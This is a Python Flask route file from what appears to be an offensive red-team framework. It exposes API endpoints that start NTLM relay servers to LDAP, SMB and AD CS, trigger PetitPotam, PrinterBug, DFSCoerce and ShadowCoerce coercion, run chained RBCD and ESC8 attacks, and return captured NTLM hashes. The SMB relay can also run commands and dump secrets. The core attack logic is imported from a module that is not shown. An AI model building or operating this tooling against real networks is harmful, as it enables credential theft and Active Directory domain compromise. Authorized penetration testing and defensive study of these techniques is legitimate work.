"""
NTLM Relay Routes
=================
API endpoints for NTLM relay and coercion attacks

Endpoints:
- POST /relay/start - Start relay server
- POST /relay/stop - Stop relay server
- POST /relay/coerce - Trigger coercion
- POST /relay/rbcd - RBCD attack
- POST /relay/adcs - AD CS ESC8 attack
- GET /relay/hashes - Get captured hashes
"""

from flask import Blueprint, request, jsonify
import logging
from datetime import datetime

from cybermodules.ntlm_relay import (
    NTLMRelayServer,
    NTLMCoercer,
    NTLMRelayChain,
    CoercionMethod,
    RelayAttack,
)

logger = logging.getLogger("relay_routes")

relay_bp = Blueprint('relay', __name__, url_prefix='/relay')

# Global relay server instance
_relay_server: NTLMRelayServer = None


# ============================================================
# RELAY SERVER MANAGEMENT
# ============================================================

@relay_bp.route('/start/ldap', methods=['POST'])
def start_ldap_relay():
    """
    Start NTLM relay to LDAP
    
    Request:
    {
        "target_dc": "dc01.corp.local",
        "attack": "rbcd",  // rbcd, shadow_creds, add_computer
        "delegate_to": "EVILPC$",
        "use_ssl": true
    }
    """
    global _relay_server
    
    data = request.get_json()
    target_dc = data.get('target_dc')
    attack = data.get('attack', 'rbcd')
    delegate_to = data.get('delegate_to')
    add_computer = data.get('add_computer')
    use_ssl = data.get('use_ssl', True)
    
    if not target_dc:
        return jsonify({
            'success': False,
            'error': 'target_dc is required'
        }), 400
    
    # Stop existing relay
    if _relay_server and _relay_server.running:
        _relay_server.stop()
    
    scan_id = int(datetime.now().timestamp())
    _relay_server = NTLMRelayServer(scan_id)
    
    # Map attack string to enum
    attack_map = {
        'rbcd': RelayAttack.RBCD,
        'shadow_creds': RelayAttack.SHADOW_CREDENTIALS,
        'add_computer': RelayAttack.ADD_COMPUTER,
        'delegate': RelayAttack.DELEGATE_ACCESS,
    }
    attack_type = attack_map.get(attack, RelayAttack.RBCD)
    
    success = _relay_server.start_relay_to_ldap(
        target_dc=target_dc,
        attack=attack_type,
        delegate_to=delegate_to,
        add_computer=add_computer,
        use_ssl=use_ssl
    )
    
    return jsonify({
        'success': success,
        'target': target_dc,
        'attack': attack,
        'listening': _relay_server.running if _relay_server else False
    })


@relay_bp.route('/start/smb', methods=['POST'])
def start_smb_relay():
    """
    Start NTLM relay to SMB
    
    Request:
    {
        "targets": ["192.168.1.10", "192.168.1.11"],
        "command": "whoami",  // Optional
        "dump_secrets": true
    }
    """
    global _relay_server
    
    data = request.get_json()
    targets = data.get('targets', [])
    command = data.get('command')
    dump_secrets = data.get('dump_secrets', False)
    
    if not targets:
        return jsonify({
            'success': False,
            'error': 'targets list is required'
        }), 400
    
    if _relay_server and _relay_server.running:
        _relay_server.stop()
    
    scan_id = int(datetime.now().timestamp())
    _relay_server = NTLMRelayServer(scan_id)
    
    success = _relay_server.start_relay_to_smb(
        targets=targets,
        command=command,
        dump_secrets=dump_secrets
    )
    
    return jsonify({
        'success': success,
        'targets': targets,
        'listening': _relay_server.running if _relay_server else False
    })


@relay_bp.route('/start/adcs', methods=['POST'])
def start_adcs_relay():
    """
    Start NTLM relay to AD CS (ESC8)
    
    Request:
    {
        "ca_host": "ca01.corp.local",
        "template": "Machine"
    }
    """
    global _relay_server
    
    data = request.get_json()
    ca_host = data.get('ca_host')
    template = data.get('template', 'Machine')
    
    if not ca_host:
        return jsonify({
            'success': False,
            'error': 'ca_host is required'
        }), 400
    
    if _relay_server and _relay_server.running:
        _relay_server.stop()
    
    scan_id = int(datetime.now().timestamp())
    _relay_server = NTLMRelayServer(scan_id)
    
    success = _relay_server.start_relay_to_adcs(
        ca_host=ca_host,
        template=template
    )
    
    return jsonify({
        'success': success,
        'ca_host': ca_host,
        'template': template,
        'listening': _relay_server.running if _relay_server else False
    })


@relay_bp.route('/stop', methods=['POST'])
def stop_relay():
    """Stop the relay server"""
    global _relay_server
    
    if _relay_server:
        _relay_server.stop()
        return jsonify({'success': True})
    
    return jsonify({
        'success': False,
        'error': 'No relay server running'
    })


@relay_bp.route('/status', methods=['GET'])
def relay_status():
    """Get relay server status"""
    global _relay_server
    
    return jsonify({
        'running': _relay_server.running if _relay_server else False,
        'captured_hashes': len(_relay_server.captured) if _relay_server else 0
    })


@relay_bp.route('/hashes', methods=['GET'])
def get_hashes():
    """Get captured NTLM hashes"""
    global _relay_server
    
    if _relay_server:
        return jsonify({
            'success': True,
            'hashes': _relay_server.get_captured_hashes()
        })
    
    return jsonify({
        'success': False,
        'hashes': []
    })


# ============================================================
# COERCION ATTACKS
# ============================================================

@relay_bp.route('/coerce/petitpotam', methods=['POST'])
def coerce_petitpotam():
    """
    PetitPotam Coercion Attack
    
    Request:
    {
        "target": "dc01.corp.local",
        "listener": "192.168.1.100",
        "username": "user",  // Optional
        "password": "pass",  // Optional
        "ntlm_hash": "..."   // Optional
    }
    """
    data = request.get_json()
    
    target = data.get('target')
    listener = data.get('listener')
    username = data.get('username')
    password = data.get('password')
    ntlm_hash = data.get('ntlm_hash')
    
    if not target or not listener:
        return jsonify({
            'success': False,
            'error': 'target and listener are required'
        }), 400
    
    scan_id = int(datetime.now().timestamp())
    coercer = NTLMCoercer(scan_id)
    
    attempt = coercer.petitpotam(
        target=target,
        listener=listener,
        username=username,
        password=password,
        ntlm_hash=ntlm_hash
    )
    
    return jsonify({
        'success': attempt.status.value in ['triggered', 'success'],
        'coercion_id': attempt.coercion_id,
        'method': attempt.method.value,
        'status': attempt.status.value,
        'error': attempt.error
    })


@relay_bp.route('/coerce/printerbug', methods=['POST'])
def coerce_printerbug():
    """PrinterBug/SpoolSample Coercion Attack"""
    data = request.get_json()
    
    target = data.get('target')
    listener = data.get('listener')
    username = data.get('username')
    password = data.get('password')
    ntlm_hash = data.get('ntlm_hash')
    
    if not target or not listener or not username:
        return jsonify({
            'success': False,
            'error': 'target, listener, and username are required'
        }), 400
    
    scan_id = int(datetime.now().timestamp())
    coercer = NTLMCoercer(scan_id)
    
    attempt = coercer.printerbug(
        target=target,
        listener=listener,
        username=username,
        password=password,
        ntlm_hash=ntlm_hash
    )
    
    return jsonify({
        'success': attempt.status.value in ['triggered', 'success'],
        'coercion_id': attempt.coercion_id,
        'method': attempt.method.value,
        'status': attempt.status.value,
        'error': attempt.error
    })


@relay_bp.route('/coerce/dfscoerce', methods=['POST'])
def coerce_dfscoerce():
    """DFSCoerce Coercion Attack"""
    data = request.get_json()
    
    target = data.get('target')
    listener = data.get('listener')
    username = data.get('username')
    password = data.get('password')
    
    if not target or not listener:
        return jsonify({
            'success': False,
            'error': 'target and listener are required'
        }), 400
    
    scan_id = int(datetime.now().timestamp())
    coercer = NTLMCoercer(scan_id)
    
    attempt = coercer.dfscoerce(
        target=target,
        listener=listener,
        username=username,
        password=password
    )
    
    return jsonify({
        'success': attempt.status.value in ['triggered', 'success'],
        'coercion_id': attempt.coercion_id,
        'method': attempt.method.value,
        'status': attempt.status.value,
        'error': attempt.error
    })


@relay_bp.route('/coerce/shadowcoerce', methods=['POST'])
def coerce_shadowcoerce():
    """ShadowCoerce Coercion Attack"""
    data = request.get_json()
    
    target = data.get('target')
    listener = data.get('listener')
    username = data.get('username')
    password = data.get('password')
    
    if not target or not listener:
        return jsonify({
            'success': False,
            'error': 'target and listener are required'
        }), 400
    
    scan_id = int(datetime.now().timestamp())
    coercer = NTLMCoercer(scan_id)
    
    attempt = coercer.shadowcoerce(
        target=target,
        listener=listener,
        username=username,
        password=password
    )
    
    return jsonify({
        'success': attempt.status.value in ['triggered', 'success'],
        'coercion_id': attempt.coercion_id,
        'method': attempt.method.value,
        'status': attempt.status.value,
        'error': attempt.error
    })


@relay_bp.route('/coerce/check', methods=['POST'])
def check_all_coercion():
    """
    Check all coercion methods against target
    
    Request:
    {
        "target": "dc01.corp.local",
        "listener": "192.168.1.100",
        "username": "user",
        "password": "pass"
    }
    """
    data = request.get_json()
    
    target = data.get('target')
    listener = data.get('listener')
    username = data.get('username')
    password = data.get('password')
    
    if not target or not listener:
        return jsonify({
            'success': False,
            'error': 'target and listener are required'
        }), 400
    
    scan_id = int(datetime.now().timestamp())
    coercer = NTLMCoercer(scan_id)
    
    results = coercer.check_all_methods(
        target=target,
        listener=listener,
        username=username,
        password=password
    )
    
    return jsonify({
        'success': any(r.status.value == 'triggered' for r in results),
        'results': [
            {
                'method': r.method.value,
                'status': r.status.value,
                'error': r.error
            }
            for r in results
        ],
        'working_methods': [
            r.method.value for r in results 
            if r.status.value == 'triggered'
        ]
    })


# ============================================================
# FULL RELAY CHAINS
# ============================================================

@relay_bp.route('/chain/rbcd', methods=['POST'])
def rbcd_attack():
    """
    Execute RBCD Attack via Relay
    
    Request:
    {
        "coerce_target": "dc01.corp.local",
        "dc_target": "dc01.corp.local",
        "delegate_to": "EVILPC$",
        "listener_ip": "192.168.1.100",
        "coerce_method": "petitpotam"
    }
    """
    data = request.get_json()
    
    coerce_target = data.get('coerce_target')
    dc_target = data.get('dc_target')
    delegate_to = data.get('delegate_to')
    listener_ip = data.get('listener_ip')
    coerce_method = data.get('coerce_method', 'petitpotam')
    
    if not all([coerce_target, dc_target, delegate_to, listener_ip]):
        return jsonify({
            'success': False,
            'error': 'coerce_target, dc_target, delegate_to, and listener_ip are required'
        }), 400
    
    method_map = {
        'petitpotam': CoercionMethod.PETITPOTAM,
        'dfscoerce': CoercionMethod.DFSCOERCE,
        'shadowcoerce': CoercionMethod.SHADOWCOERCE,
    }
    method = method_map.get(coerce_method, CoercionMethod.PETITPOTAM)
    
    scan_id = int(datetime.now().timestamp())
    chain = NTLMRelayChain(scan_id)
    
    try:
        result = chain.execute_rbcd_attack(
            coerce_target=coerce_target,
            dc_target=dc_target,
            delegate_to=delegate_to,
            listener_ip=listener_ip,
            coerce_method=method
        )
        
        return jsonify({
            'success': result.success,
            'relay_id': result.relay_id,
            'coercion_attempts': len(result.coercion_attempts),
            'rbcd_delegations': result.rbcd_delegations,
            'captured_hashes': len(result.captured_hashes)
        })
        
    except Exception as e:
        logger.error(f"RBCD attack failed: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@relay_bp.route('/chain/adcs', methods=['POST'])
def adcs_attack():
    """
    Execute AD CS ESC8 Attack via Relay
    
    Request:
    {
        "coerce_target": "dc01.corp.local",
        "ca_host": "ca01.corp.local",
        "listener_ip": "192.168.1.100",
        "template": "Machine"
    }
    """
    data = request.get_json()
    
    coerce_target = data.get('coerce_target')
    ca_host = data.get('ca_host')
    listener_ip = data.get('listener_ip')
    template = data.get('template', 'Machine')
    
    if not all([coerce_target, ca_host, listener_ip]):
        return jsonify({
            'success': False,
            'error': 'coerce_target, ca_host, and listener_ip are required'
        }), 400
    
    scan_id = int(datetime.now().timestamp())
    chain = NTLMRelayChain(scan_id)
    
    try:
        result = chain.execute_adcs_relay(
            coerce_target=coerce_target,
            ca_host=ca_host,
            listener_ip=listener_ip,
            template=template
        )
        
        return jsonify({
            'success': result.success,
            'relay_id': result.relay_id,
            'coercion_attempts': len(result.coercion_attempts),
            'adcs_certificates': result.adcs_certificates,
            'captured_hashes': len(result.captured_hashes)
        })
        
    except Exception as e:
        logger.error(f"AD CS attack failed: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@relay_bp.route('/diagram', methods=['GET'])
def get_relay_diagram():
    """Get relay attack diagram"""
    chain = NTLMRelayChain(0)
    return jsonify({
        'diagram': chain.generate_attack_diagram()
    })
